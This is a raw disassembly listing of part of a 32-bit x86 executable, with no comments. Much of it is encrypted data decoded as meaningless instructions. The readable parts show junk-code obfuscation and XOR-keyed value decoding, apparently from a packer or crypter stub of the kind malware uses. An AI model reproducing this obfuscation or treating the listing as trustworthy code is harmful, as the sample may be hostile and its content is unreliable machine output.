  4061e7:	mov    bh,dh
  4061e9:	fisubr WORD PTR [ebx-0x5f]
  4061ec:	in     al,dx
  4061ed:	adc    DWORD PTR [ebx+edx*2+0x764ad40],ecx
  4061f4:	pushf  
  4061f5:	repnz hlt 
  4061f7:	dec    edi
  4061f8:	maxps  xmm7,xmm1
  4061fb:	pushf  
  4061fc:	stos   BYTE PTR es:[edi],al
  4061fd:	(bad)  
  4061fe:	out    dx,al
  4061ff:	xchg   ecx,esp
  406201:	(bad)  
  406202:	retf   0x3013
  406205:	mov    BYTE PTR ds:0x6a1074d7,ch
  40620b:	das    
  40620c:	test   DWORD PTR [eax+0x4acadc88],edi
  406212:	sub    ecx,DWORD PTR [edx+0xe1947f5]
  406218:	aam    0x5f
  40621a:	mov    eax,0x301d0006
  40621f:	add    al,0x12
  406221:	or     eax,0x2b11f1
  406226:	xchg   esi,eax
  406227:	out    0xfe,eax
  406229:	push   0xffffffa0
  40622b:	loop   0x406224
  40622d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40622e:	dec    eax
  40622f:	xor    ebx,DWORD PTR [edi+0x15ab3913]
  406235:	retf   0x435f
  406238:	repz dec esp
  40623a:	or     edi,ebx
  40623c:	rol    bl,cl
  40623e:	icebp  
  40623f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406240:	lea    edi,[edi-0x7a]
  406243:	out    dx,eax
  406244:	aaa    
  406245:	push   ds
  406246:	jmp    0x6562a634
  40624b:	shr    BYTE PTR [ebp+0x6c],0xde
  40624f:	pop    ecx
  406250:	fidiv  DWORD PTR [edi-0x303cfe1d]
  406256:	mov    al,0x41
  406258:	hlt    
  406259:	cmp    DWORD PTR [edi+ecx*4+0x47],esi
  40625d:	cmp    ecx,DWORD PTR [ecx]
  40625f:	mov    BYTE PTR [ebx-0x3f],bh
  406262:	jmp    FWORD PTR [ebp+0x2581f033]
  406268:	and    edi,DWORD PTR [eax]
  40626a:	inc    ebx
  40626b:	add    BYTE PTR [eax],al
  40626d:	add    BYTE PTR [eax],al
  40626f:	add    cl,ch
  406271:	or     eax,0x8b000000
  406276:	or     eax,0x433823
  40627b:	inc    ecx
  40627c:	mov    DWORD PTR ds:0x433823,ecx
  406282:	cmp    DWORD PTR ds:0x433823,0x1d
  406289:	jae    0x4062c6
  40628f:	cmp    DWORD PTR ds:0x433823,0xb
  406296:	jne    0x4062a7
  40629c:	push   0x3d1a
  4062a1:	call   DWORD PTR ds:0x4120c8
  4062a7:	cmp    DWORD PTR ds:0x433823,0xa
  4062ae:	jne    0x4062c1
  4062b4:	mov    ecx,DWORD PTR ds:0x433823
  4062ba:	inc    ecx
  4062bb:	mov    DWORD PTR ds:0x433823,ecx
  4062c1:	jmp    0x406275
  4062c6:	mov    eax,DWORD PTR [edx+0x194]
  4062cc:	mov    ecx,DWORD PTR [eax]
  4062ce:	mov    eax,DWORD PTR [ecx+0x3c]
  4062d1:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4062d5:	add    eax,ecx
  4062d7:	mov    DWORD PTR [ebp+0x8],esi
  4062da:	mov    DWORD PTR [ebp+0x10],eax
  4062dd:	mov    eax,DWORD PTR [ebp+0x10]
  4062e0:	pop    esi
  4062e1:	test   eax,eax
  4062e3:	je     0x406656
  4062e9:	push   DWORD PTR ds:0x413c0c
  4062ef:	push   DWORD PTR ds:0x4139b8
  4062f5:	mov    eax,DWORD PTR [edx+0x194]
  4062fb:	push   DWORD PTR [eax]
  4062fd:	mov    eax,DWORD PTR [ebp+0x10]
  406300:	jmp    0x40664f
  406305:	lahf   
  406306:	cmp    al,0x1a
  406308:	push   ds
  406309:	pop    ecx
  40630a:	fcomp  DWORD PTR [ebx-0x2e0ee343]
  406310:	cmc    
  406311:	ficomp WORD PTR [si+0x3f54]
  406317:	jle    0x406397
  406319:	sub    al,0x7d
  40631b:	jle    0x40639b
  40631d:	jo     0x4062a7
  40631f:	das    
  406320:	repnz fdiv st(3),st
  406323:	ret    
  406324:	loop   0x4062e9
  406326:	scas   eax,DWORD PTR es:[edi]
  406327:	aas    
  406328:	pop    ds
  406329:	lahf   
  40632a:	out    dx,al
  40632b:	mov    ebx,0x8c52b6cd
  406330:	ins    BYTE PTR es:[edi],dx
  406331:	std    
  406332:	pop    esp
  406333:	push   cs
  406334:	aad    0xd6
  406336:	(bad)  
  406337:	mov    al,0xd1
  406339:	std    
  40633a:	clc    
  40633b:	dec    esp
  40633c:	xchg   ecx,eax
  40633d:	and    DWORD PTR [ecx],esi
  40633f:	sbb    dh,ah
  406341:	es js  0x406338
  406344:	push   ebp
  406345:	loopne 0x4063ad
  406347:	fwait
  406348:	push   esp
  406349:	mov    eax,ds:0x7826574
  40634e:	jecxz  0x4062e8
  406350:	pop    esi
  406351:	xchg   edi,eax
  406352:	inc    esp
  406353:	mov    DWORD PTR [edi],ebp
  406355:	popf   
  406356:	push   ebx
  406357:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406358:	stos   BYTE PTR es:[edi],al
  406359:	fst    DWORD PTR [edi]
  40635b:	adc    dh,ah
  40635d:	int3   
  40635e:	arpl   cx,si
  406360:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406361:	call   0x52b5:0x532ff622
  406368:	nop
  406369:	enter  0x5eb5,0xba
  40636d:	rol    BYTE PTR [eax],0x1
  406370:	inc    ecx
  406371:	and    BYTE PTR cs:[edi+0x5b0e485],0x28
  406379:	mov    ds:0x7d6eb02,eax
  40637e:	adc    bl,BYTE PTR [esi-0x3fe4f9d6]
  406384:	addr16 data16 jmp 0x406375
  406388:	pop    eax
  406389:	scas   eax,DWORD PTR es:[edi]
  40638a:	ss jmp 0x4063f7
  40638d:	add    al,0x1a
  40638f:	or     dl,bh
  406391:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406392:	add    dl,ah
  406394:	xlat   BYTE PTR es:[ebx]
  406396:	xor    eax,ecx
  406398:	je     0x40631c
  40639a:	into   
  40639b:	inc    ebx
  40639c:	shl    DWORD PTR [ebx+0x70],0xb0
  4063a0:	sub    DWORD PTR [edi+eiz*4-0x23],edi
  4063a4:	not    DWORD PTR [ebx+0x77dd21fa]
  4063aa:	cdq    
  4063ab:	mov    ch,0x2
  4063ad:	cmc    
  4063ae:	das    
  4063af:	cwde   
  4063b0:	pop    esi
  4063b1:	sbb    esp,DWORD PTR [eax-0x4c887f7f]
  4063b7:	pop    ebx
  4063b8:	lahf   
  4063b9:	add    al,0xf8
  4063bb:	gs packssdw mm4,mm0
  4063bf:	or     DWORD PTR [edi],ebx
  4063c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063c2:	ins    DWORD PTR es:[edi],dx
  4063c3:	loopne 0x406419
  4063c5:	add    BYTE PTR [eax],dl
  4063c7:	sub    edi,DWORD PTR [ebx]
  4063c9:	lds    edi,FWORD PTR ds:0x7e39b9b
  4063cf:	out    dx,eax
  4063d0:	and    eax,0x829e3d5f
  4063d5:	test   BYTE PTR [eax],dh
  4063d7:	and    ah,BYTE PTR [esi+esi*8+0x1f0fa584]
  4063de:	popa   
  4063df:	test   al,0xa8
  4063e1:	aaa    
  4063e2:	popf   
  4063e3:	jmp    0x406464
  4063e5:	in     al,dx
  4063e6:	or     al,0x98
  4063e8:	mov    eax,ds:0x5dbf5b23
  4063ed:	xchg   ecx,eax
  4063ee:	(bad)  
  4063ef:	mov    esi,0x97d0d29d
  4063f4:	or     DWORD PTR [edx-0x28de4f69],eax
  4063fa:	inc    ebp
  4063fb:	aas    
  4063fc:	sub    DWORD PTR ds:0xbf5b6a73,ebx
  406402:	mov    ds:0x83c49055,al
  406407:	push   ebx
  406408:	fs jmp 0x7e4f3e41
  40640e:	out    dx,al
  40640f:	and    DWORD PTR [ebp+edx*8-0x37966c3b],ecx
  406416:	shr    BYTE PTR [esi],0xe2
  406419:	inc    eax
  40641a:	mov    ebp,0x2ef92a26
  40641f:	ins    BYTE PTR es:[edi],dx
  406420:	cld    
  406421:	push   0x7f9b5cfc
  406426:	adc    eax,0xa1bb19f
  40642b:	and    esp,ecx
  40642d:	scas   eax,DWORD PTR es:[edi]
  40642e:	fdivr  st(0),st
  406430:	lods   al,BYTE PTR ds:[esi]
  406431:	pop    es
  406432:	(bad)  
  406433:	ins    BYTE PTR es:[edi],dx
  406434:	or     ecx,DWORD PTR [edx-0x3ab6d0c6]
  40643a:	add    cl,BYTE PTR [edi]
  40643c:	out    0xaf,al
  40643e:	jmp    0xe213:0x17c18ca0
  406445:	inc    eax
  406446:	jnp    0x40644c
  406448:	and    edx,esp
  40644a:	mov    ebp,0xf9da270d
  40644f:	cwde   
  406450:	xor    eax,0x8718549a
  406455:	pusha  
  406456:	push   esi
  406457:	or     al,0xf3
  406459:	rol    ecx,cl
  40645b:	xchg   esp,eax
  40645c:	sbb    eax,0x588f7746
  406461:	ins    DWORD PTR es:[edi],dx
  406462:	psllw  mm5,QWORD PTR [edx+0x33]
  406466:	xchg   edi,eax
  406467:	inc    esi
  406468:	xlat   BYTE PTR ds:[ebx]
  406469:	js     0x4064c9
  40646b:	aas    
  40646c:	jo     0x4064a9
  40646e:	sbb    eax,0xb5517f9b
  406473:	imul   ebp,DWORD PTR [esi],0xa823a4ae
  406479:	dec    edx
  40647a:	adc    esi,edi
  40647c:	sbb    BYTE PTR [eax+eiz*8-0x7dbb0a0a],bl
  406483:	inc    ebp
  406484:	inc    eax
  406485:	lock pop edi
  406487:	ins    BYTE PTR es:[edi],dx
  406488:	xchg   ecx,eax
  406489:	and    al,0x25
  40648b:	ret    
  40648c:	lea    esp,[esp+ecx*1+0x77991f98]
  406493:	repnz push dx
  406496:	(bad)  
  406497:	jne    0x40644f
  406499:	ins    WORD PTR es:[edi],dx
  40649b:	xor    BYTE PTR [eax-0x3],ah
  40649e:	add    DWORD PTR [eax],edi
  4064a0:	xor    BYTE PTR [ebx-0x5bc8d35c],ch
  4064a6:	aas    
  4064a7:	and    DWORD PTR [ecx+0x6b37efca],0xffffffe6
  4064ae:	addr16 mov eax,0x5eb34b9a
  4064b4:	push   0xfffffff3
  4064b6:	cmc    
  4064b7:	(bad)  
  4064b8:	out    dx,eax
  4064b9:	sahf   
  4064ba:	xor    bh,bl
  4064bc:	test   BYTE PTR ds:0xf0d576e0,bh
  4064c2:	cmp    eax,0xf5ec03ae
  4064c7:	out    0x74,al
  4064c9:	sahf   
  4064ca:	shr    DWORD PTR [ecx],1
  4064cc:	mov    ds:0xde4c4c01,al
  4064d1:	les    ecx,FWORD PTR [ebp-0x36]
  4064d4:	mov    bl,0x6d
  4064d6:	jge    0x40647c
  4064d8:	sbb    eax,DWORD PTR ds:0x68817510
  4064de:	sbb    al,0xaf
  4064e0:	push   ebx
  4064e1:	retf   
  4064e2:	rcr    DWORD PTR [esi+0x7d539527],0xd5
  4064e9:	fs icebp 
  4064eb:	push   ss
  4064ec:	and    al,BYTE PTR fs:[esi+0x67b512b7]
  4064f3:	xchg   esi,eax
  4064f4:	fidivr WORD PTR [ebx+0x25]
  4064f7:	repnz adc al,BYTE PTR [eax-0x61]
  4064fb:	dec    eax
  4064fc:	adc    ah,al
  4064fe:	or     ecx,ebx
  406500:	ret    0x598f
  406503:	inc    ebx
  406504:	push   edi
  406505:	ror    DWORD PTR [ebp+0x7c],1
  406508:	cmp    BYTE PTR [esi+eiz*2+0x11],ah
  40650c:	cmp    esi,ebx
  40650e:	push   ss
  40650f:	test   eax,0xe2693dee
  406514:	lock sbb ecx,0x0
  406518:	dec    edx
  406519:	inc    ebx
  40651a:	ret    0x9e50
  40651d:	push   eax
  40651e:	sub    eax,0x5c9aef22
  406523:	rcr    esi,cl
  406525:	lds    edx,FWORD PTR [ecx-0x1c5a1dfe]
  40652b:	xchg   ebp,eax
  40652c:	nop
  40652d:	aad    0x75
  40652f:	rcr    DWORD PTR [eax],1
  406531:	pop    ecx
  406532:	mul    ah
  406534:	jno    0x406580
  406536:	(bad)  
  406537:	xor    eax,0xa4c6086
  40653c:	(bad)  
  40653d:	mov    bh,0x49
  40653f:	jae    0x4065ad
  406541:	leave  
  406542:	mov    eax,ds:0x7e2433ed
  406547:	mov    ?,ebp
  406549:	scas   eax,DWORD PTR es:[edi]
  40654a:	ins    DWORD PTR es:[edi],dx
  40654b:	jp     0x4064f7
  40654d:	dec    edx
  40654e:	cmp    DWORD PTR [esp+eiz*2],ecx
  406551:	adc    BYTE PTR [ebx],ah
  406553:	or     bh,BYTE PTR [esi-0x4c]
  406556:	mov    edi,0xeccdd628
  40655b:	leave  
  40655c:	lods   al,BYTE PTR ds:[esi]
  40655d:	sub    ch,dh
  40655f:	cmp    al,al
  406561:	dec    eax
  406562:	(bad)  
  406564:	fld    QWORD PTR [ebp-0x56]
  406567:	rcl    cl,cl
  406569:	retf   0xb438
  40656c:	test   BYTE PTR [edx-0x7984ccca],al
  406572:	xor    ecx,edi
  406574:	popa   
  406575:	(bad)  
  406576:	call   0xffdd4425
  40657b:	loopne 0x4065b7
  40657d:	mov    eax,ds:0x5137a17e
  406582:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406583:	mov    dl,0xad
  406585:	popa   
  406586:	es dec eax
  406588:	jg     0x4065bd
  40658a:	mov    edx,0xc3f78391
  40658f:	mov    esp,0x37f91867
  406594:	pop    edx
  406595:	int3   
  406596:	ja     0x406584
  406598:	call   0xccd54770
  40659d:	sbb    al,ah
  40659f:	push   edx
  4065a0:	mov    DWORD PTR [ecx+esi*2+0x7],ebx
  4065a4:	pop    edi
  4065a5:	inc    eax
  4065a6:	cmp    DWORD PTR [edx-0x5f],esi
  4065a9:	xchg   ebp,eax
  4065aa:	mov    bh,0x97
  4065ac:	rcl    DWORD PTR [edi],cl
  4065ae:	jbe    0x4065cd
  4065b0:	test   al,0x46
  4065b2:	cmp    dh,bh
  4065b4:	jge    0x406605
  4065b6:	add    al,0x3d
  4065b8:	xchg   DWORD PTR ds:0xf5ee640b,esi
  4065be:	jae    0x40659a
  4065c0:	lahf   
  4065c1:	push   esp
  4065c2:	rol    BYTE PTR ds:0x40505628,cl
  4065c8:	sub    al,0x74
  4065ca:	fcom   QWORD PTR [esi-0x22fff782]
  4065d0:	sahf   
  4065d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065d2:	xchg   edx,eax
  4065d3:	jne    0x40663b
  4065d5:	pop    ecx
  4065d6:	test   eax,0x5f950b4a
  4065db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4065dc:	outs   dx,DWORD PTR ds:[esi]
  4065dd:	mov    ecx,DWORD PTR ds:0x3ab21a28
  4065e3:	mov    al,BYTE PTR [edx]
  4065e5:	lahf   
  4065e6:	or     dh,cl
  4065e8:	addr16 adc esi,ebp
  4065eb:	nop
  4065ec:	cmp    ecx,DWORD PTR [ecx]
  4065ee:	jmp    0x699f:0x40b11ccb
  4065f5:	sbb    edi,DWORD PTR [edx+0x2]
  4065f8:	std    
  4065f9:	sbb    BYTE PTR [esi],dl
  4065fb:	(bad)  
  4065fc:	loope  0x4065c3
  4065fe:	mov    bl,0xc2
  406600:	cli    
  406601:	pop    esp
  406602:	js     0x406631
  406604:	xchg   ebp,eax
  406605:	into   
  406606:	pop    edi
  406607:	fcomp  QWORD PTR fs:[eax+0xb]
  40660b:	bound  edx,QWORD PTR es:[esp+ebp*8+0x63e875f2]
  406613:	sti    
  406614:	rol    ebp,cl
  406616:	sar    DWORD PTR [ecx+0x2fafafcc],0xc3
  40661d:	repz push ds
  40661f:	or     al,0x2b
  406621:	es jmp 0xc623706c
  406627:	imul   ebp,DWORD PTR [esi+0x5f4c61a4],0xffffffc2
  40662e:	cli    
  40662f:	ja     0x4065c1
  406631:	lahf   
  406632:	add    ebx,eax
  406634:	cmp    BYTE PTR [ecx-0x41d7f2b],dl
  40663a:	into   
  40663b:	(bad)  
  40663c:	repz jp 0x40665c
  40663f:	in     eax,dx
  406640:	icebp  
  406641:	lock stc 
  406643:	loop   0x406644
  406645:	push   eax
  406646:	scas   al,BYTE PTR es:[edi]
  406647:	retf   
  406648:	sub    DWORD PTR [ebx+edx*2+0x2c5b1095],0x3e9d0ff
  406653:	add    BYTE PTR [eax],al
  406655:	add    BYTE PTR [ebx-0x3d36efbb],cl
  40665b:	or     al,0x0
  40665d:	push   ebp
  40665e:	mov    ebp,esp
  406660:	sub    esp,0x28
  406663:	push   0x413cb4
  406668:	call   DWORD PTR ds:0x412408
  40666e:	mov    DWORD PTR ds:0x4336fb,0x6571
  406678:	cmp    WORD PTR [eax],0x0
  40667c:	jne    0x406afe
  406682:	push   0x413d04
  406687:	call   DWORD PTR ds:0x412404
  40668d:	mov    DWORD PTR ds:0x4337d3,0x5ed5
  406697:	cmp    BYTE PTR [eax],0x0
  40669a:	mov    DWORD PTR ds:0x4337a7,0x18c3
  4066a4:	jne    0x406b09
  4066aa:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  4066b1:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  4066b8:	lea    eax,[ebp-0x20]
  4066bb:	mov    DWORD PTR [ebp-0x14],eax
  4066be:	lea    eax,[ebp-0x1c]
  4066c1:	and    DWORD PTR ds:0x4337e3,0x0
  4066cb:	mov    ecx,DWORD PTR ds:0x4337e3
  4066d1:	inc    ecx
  4066d2:	mov    DWORD PTR ds:0x4337e3,ecx
  4066d8:	cmp    DWORD PTR ds:0x4337e3,0x5
  4066df:	jne    0x4066f8
  4066e5:	push   0x2ad8
  4066ea:	push   DWORD PTR [ebp-0x1c]
  4066ed:	push   0x433903
  4066f2:	call   DWORD PTR ds:0x412340
  4066f8:	cmp    DWORD PTR ds:0x4337e3,0x4
  4066ff:	jne    0x406714
  406705:	xor    ecx,ecx
  406707:	or     ecx,DWORD PTR ds:0x4337e3
  40670d:	inc    ecx
  40670e:	mov    DWORD PTR ds:0x4337e3,ecx
  406714:	cmp    DWORD PTR ds:0x4337e3,0x1f
  40671b:	jb     0x4066cb
  406721:	movzx  ecx,WORD PTR ds:0x4337d7
  406728:	and    ecx,DWORD PTR ds:0x43370f
  40672e:	mov    DWORD PTR ds:0x4337d7,ecx
  406734:	mov    DWORD PTR [ebp-0x10],eax
  406737:	adc    DWORD PTR ds:0x43371b,ecx
  40673d:	mov    eax,ds:0x413b34
  406742:	sbb    ecx,DWORD PTR ds:0x43382b
  406748:	mov    eax,DWORD PTR [eax+0x1c8]
  40674e:	mov    eax,DWORD PTR [eax]
  406750:	sub    DWORD PTR ds:0x433713,ebx
  406756:	mov    ecx,DWORD PTR [ebp-0x10]
  406759:	push   ebx
  40675a:	xor    DWORD PTR ds:0x43376b,edx
  406760:	push   esi
  406761:	and    DWORD PTR ds:0x433707,0x0
  40676b:	jmp    0x40677d
  406770:	mov    ebx,DWORD PTR ds:0x433707
  406776:	inc    ebx
  406777:	mov    DWORD PTR ds:0x433707,ebx
  40677d:	cmp    DWORD PTR ds:0x433707,0x1b
  406784:	jae    0x4067ac
  40678a:	cmp    DWORD PTR ds:0x433707,0x23
  406791:	jne    0x4067a7
  406797:	push   0x433933
  40679c:	push   DWORD PTR [ebp-0x18]
  40679f:	push   0x0
  4067a1:	call   DWORD PTR ds:0x412344
  4067a7:	jmp    0x406770
  4067ac:	mov    esi,0x7510854
  4067b1:	sub    DWORD PTR ds:0x4337ab,0x6a10
  4067bb:	xor    eax,esi
  4067bd:	adc    DWORD PTR ds:0x433797,0x4337a7
  4067c7:	push   edi
  4067c8:	mov    edi,0x32729b
  4067cd:	add    eax,edi
  4067cf:	mov    ebx,0x337e
  4067d4:	mov    DWORD PTR [ecx],eax
  4067d6:	mov    eax,ds:0x413e08
  4067db:	cmp    eax,0x23c13046
  4067e0:	mov    eax,DWORD PTR [ebp-0x4]
  4067e3:	mov    ebx,0xf89c853d
  4067e8:	je     0x406824
  4067ee:	or     ecx,DWORD PTR ds:0x4337d3
  4067f4:	mov    ecx,DWORD PTR [ebp-0x8]
  4067f7:	sbb    DWORD PTR ds:0x43376b,0x4ed6
  406801:	xor    eax,esi
  406803:	add    eax,edi
  406805:	sbb    DWORD PTR ds:0x433713,0x43379f
  40680f:	imul   eax,ecx
  406812:	mov    DWORD PTR [ebp-0x8],eax
  406815:	mov    DWORD PTR ds:0x433707,0x49d5
  40681f:	jmp    0x4068d7
  406824:	or     ecx,DWORD PTR ds:0x4337af
  40682a:	xor    eax,esi
  40682c:	and    ecx,0x6df5
  406832:	add    eax,edi
  406834:	xor    ecx,ecx
  406836:	add    ecx,DWORD PTR ds:0x4337e3
  40683c:	and    DWORD PTR ds:0x4337a7,ecx
  406842:	mov    ds:0x413c48,eax
  406847:	mov    ecx,DWORD PTR ds:0x43382b
  40684d:	or     DWORD PTR ds:0x4337e3,ecx
  406853:	mov    eax,DWORD PTR [ebp-0x8]
  406856:	add    DWORD PTR ds:0x43375b,0x62ed
  406860:	xor    eax,esi
  406862:	and    DWORD PTR ds:0x43381f,ebx
  406868:	add    eax,edi
  40686a:	mov    ecx,DWORD PTR ds:0x4337ab
  406870:	sub    DWORD PTR ds:0x4337d3,ecx
  406876:	mov    ds:0x413e08,eax
  40687b:	sbb    ecx,ecx
  40687d:	mov    eax,DWORD PTR [ebp-0x4]
  406880:	and    DWORD PTR ds:0x43370b,ecx
  406886:	mov    ecx,DWORD PTR ds:0x413c48
  40688c:	sbb    DWORD PTR ds:0x433707,0x486c
  406896:	xor    eax,esi
  406898:	adc    DWORD PTR ds:0x433713,0x6147
  4068a2:	add    eax,edi
  4068a4:	cmp    ecx,eax
  4068a6:	mov    DWORD PTR ds:0x43370f,0x4c28
  4068b0:	jne    0x4068d7
  4068b6:	sub    DWORD PTR ds:0x433723,0x43382b
  4068c0:	push   ebx
  4068c1:	or     DWORD PTR ds:0x43379b,0x4337df
  4068cb:	push   DWORD PTR [ebp-0x4]
  4068ce:	push   DWORD PTR [ebp-0x8]
  4068d1:	call   DWORD PTR ds:0x413c40
  4068d7:	mov    eax,ds:0x413b34
  4068dc:	mov    eax,DWORD PTR [eax+0x18c]
  4068e2:	and    DWORD PTR ds:0x4337e7,0x433793
  4068ec:	mov    eax,DWORD PTR [eax]
  4068ee:	mov    DWORD PTR [ebp-0x18],eax
  4068f1:	mov    DWORD PTR [ebp-0x10],ebx
  4068f4:	or     DWORD PTR ds:0x433753,0x1d95
  4068fe:	mov    DWORD PTR [ebp-0x10],ebx
  406901:	sub    DWORD PTR ds:0x43375b,0x4337ef
  40690b:	mov    DWORD PTR [ebp-0x10],ebx
  40690e:	sub    DWORD PTR ds:0x4337ab,0x43376f
  406918:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40691f:	and    DWORD PTR ds:0x43375b,0x43379b
  406929:	mov    DWORD PTR [ebp-0x28],ebx
  40692c:	dec    DWORD PTR ds:0x4336fb
  406932:	mov    DWORD PTR [ebp-0x28],0xf89c8539
  406939:	mov    ebx,DWORD PTR [ebp-0x8]
  40693c:	adc    DWORD PTR ds:0x4336fb,0x433723
  406946:	xor    ebx,esi
  406948:	add    ebx,edi
  40694a:	jmp    0x4069ee
  40694f:	not    DWORD PTR ds:0x4337db
  406955:	mov    eax,DWORD PTR [ebp-0x4]
  406958:	xor    eax,esi
  40695a:	lea    eax,[eax+ebx*1+0x32729b]
  406961:	push   eax
  406962:	mov    eax,DWORD PTR [ebp-0x10]
  406965:	xor    eax,esi
  406967:	lea    eax,[ebp+eax*1+0x3272a3]
  40696e:	push   eax
  40696f:	adc    DWORD PTR ds:0x4336ff,0x8003
  406979:	mov    eax,ds:0x413b34
  40697e:	xor    DWORD PTR ds:0x4337ef,0x2bd0
  406988:	push   DWORD PTR [eax+0x1bc]
  40698e:	call   0x40f058
  406993:	mov    eax,DWORD PTR [ebp-0x4]
  406996:	add    ecx,0x2fd0
  40699c:	xor    eax,esi
  40699e:	and    DWORD PTR ds:0x43381b,0x0
  4069a8:	mov    ecx,DWORD PTR ds:0x43381b
  4069ae:	inc    ecx
  4069af:	mov    DWORD PTR ds:0x43381b,ecx
  4069b5:	cmp    DWORD PTR ds:0x43381b,0x17
  4069bc:	jne    0x4069c8
  4069c2:	call   DWORD PTR ds:0x4120cc
  4069c8:	cmp    DWORD PTR ds:0x43381b,0x11
  4069cf:	jb     0x4069a8
  4069d5:	mov    ecx,DWORD PTR ds:0x433797
  4069db:	adc    ecx,DWORD PTR ds:0x43375f
  4069e1:	mov    DWORD PTR ds:0x433797,ecx
  4069e7:	lea    ebx,[ebx+eax*1+0x32729b]
  4069ee:	mov    eax,DWORD PTR [ebp-0x4]
  4069f1:	mov    ecx,DWORD PTR [ebp-0x4]
  4069f4:	xor    ecx,esi
  4069f6:	xor    eax,esi
  4069f8:	add    eax,ecx
  4069fa:	mov    ecx,DWORD PTR [ebp-0x4]
  4069fd:	xor    ecx,esi
  4069ff:	lea    eax,[eax+ecx*1+0x9757d1]
  406a06:	cmp    ebx,eax
  406a08:	jbe    0x40694f
  406a0e:	mov    eax,DWORD PTR [ebp+0xc]
  406a11:	mov    ds:0x4139b8,eax
  406a16:	mov    eax,DWORD PTR [ebp+0x10]
  406a19:	mov    ds:0x413c0c,eax
  406a1e:	mov    eax,ds:0x4139b8
  406a23:	mov    ecx,DWORD PTR [ebp-0x14]
  406a26:	push   DWORD PTR [ebp-0x18]
  406a29:	sub    eax,edi
  406a2b:	push   DWORD PTR [ebp-0x1c]
  406a2e:	xor    eax,esi
  406a30:	mov    DWORD PTR [ecx],eax
  406a32:	push   DWORD PTR [ebp-0x20]
  406a35:	call   0x40d59f
  406a3a:	sub    eax,edi
  406a3c:	xor    eax,esi
  406a3e:	mov    DWORD PTR [ebp+0xc],eax
  406a41:	mov    ecx,DWORD PTR [ebp-0x4]
  406a44:	mov    eax,DWORD PTR [ebp+0xc]
  406a47:	xor    ecx,esi
  406a49:	add    ecx,edi
  406a4b:	xor    edx,edx
  406a4d:	div    ecx
  406a4f:	mov    ecx,DWORD PTR [ebp-0x8]
  406a52:	cmp    ecx,eax
  406a54:	jne    0x406a5f
  406a5a:	call   0x401000
  406a5f:	lea    eax,[ebp+0x4]
  406a62:	mov    DWORD PTR [ebp-0x24],eax
  406a65:	mov    eax,ds:0x413b34
  406a6a:	push   0x4
  406a6c:	add    eax,0x1cc
  406a71:	push   eax
  406a72:	lea    eax,[ebp-0xc]
  406a75:	push   eax
  406a76:	call   0x40f058
  406a7b:	mov    eax,DWORD PTR [ebp-0xc]
  406a7e:	mov    eax,DWORD PTR [ebp-0x4]
  406a81:	mov    eax,DWORD PTR [ebp-0x8]
  406a84:	mov    DWORD PTR [ebp+0xc],eax
  406a87:	mov    eax,ds:0x413bb8
  406a8c:	mov    ecx,DWORD PTR [ebp+0xc]
  406a8f:	sub    eax,edi
  406a91:	xor    eax,esi
  406a93:	cmp    eax,ecx
  406a95:	je     0x406adc
  406a9b:	mov    eax,ds:0x413bb0
  406aa0:	mov    ecx,DWORD PTR [ebp+0xc]
  406aa3:	sub    eax,edi
  406aa5:	xor    eax,esi
  406aa7:	cmp    eax,ecx
  406aa9:	jne    0x406abf
  406aaf:	mov    eax,ds:0x413bb8
  406ab4:	add    eax,DWORD PTR ds:0x413bb0
  406aba:	jmp    0x406ac6
  406abf:	mov    eax,DWORD PTR [ebp+0xc]
  406ac2:	xor    eax,esi
  406ac4:	add    eax,edi
  406ac6:	mov    ds:0x413bb0,eax
  406acb:	mov    eax,DWORD PTR [ebp+0xc]
  406ace:	xor    eax,esi
  406ad0:	add    eax,edi
  406ad2:	mov    ds:0x413bb8,eax
  406ad7:	jmp    0x406ae6
  406adc:	mov    eax,ds:0x413bb8
  406ae1:	mov    ds:0x413bb0,eax
  406ae6:	mov    eax,DWORD PTR [ebp-0x24]
  406ae9:	mov    ecx,DWORD PTR ds:0x413bb0
  406aef:	add    DWORD PTR [eax],ecx
  406af1:	mov    eax,DWORD PTR [ebp-0xc]
  406af4:	mov    eax,DWORD PTR [eax]
  406af6:	pop    edi
  406af7:	pop    esi
  406af8:	pop    ebx
  406af9:	jmp    0x406b0b
  406afe:	push   0x87687689
  406b03:	call   DWORD PTR ds:0x412364
  406b09:	xor    eax,eax
  406b0b:	leave  
  406b0c:	ret    0xc
  406b0f:	push   ebp
  406b10:	mov    ebp,esp
  406b12:	push   ecx
  406b13:	mov    DWORD PTR ds:0x433793,0x272d
  406b1d:	push   ecx
  406b1e:	mov    eax,0x5a3fc98
  406b23:	mov    DWORD PTR [ebp-0x4],eax
  406b26:	mov    DWORD PTR ds:0x433767,ecx
  406b2c:	mov    ecx,DWORD PTR [ebp-0x4]
  406b2f:	mov    DWORD PTR ds:0x433793,0x4de2
  406b39:	mov    DWORD PTR [ebp-0x8],0x4ec1
  406b40:	mov    DWORD PTR ds:0x43370f,0x33b9
  406b4a:	cmp    ecx,eax
  406b4c:	jne    0x40734f
  406b52:	or     ecx,DWORD PTR ds:0x43379b
  406b58:	mov    ax,WORD PTR [ebp-0x8]
  406b5c:	sbb    DWORD PTR ds:0x43371b,ebx
  406b62:	mov    ecx,0x8a3c
  406b67:	mov    DWORD PTR ds:0x4337d3,0x29a7
  406b71:	jmp    0x406d50
  406b76:	cwde   
  406b77:	sahf   
  406b78:	inc    edi
  406b79:	mov    bh,0x41
  406b7b:	ja     0x406be5
  406b7d:	mov    cl,0xc9
  406b7f:	mov    DWORD PTR [ecx],0x4090e45f
  406b85:	jo     0x406b89
  406b87:	cmp    edi,DWORD PTR [esi+0x7e]
  406b8a:	mov    esp,0x9e7e7e7f
  406b8f:	data16 ja 0x406b24
  406b92:	push   eax
  406b93:	cld    
  406b94:	out    0x94,eax
  406b96:	ds inc esp
  406b98:	xor    DWORD PTR [edi-0x53],eax
  406b9b:	push   ebx
  406b9c:	lea    edx,[eax]
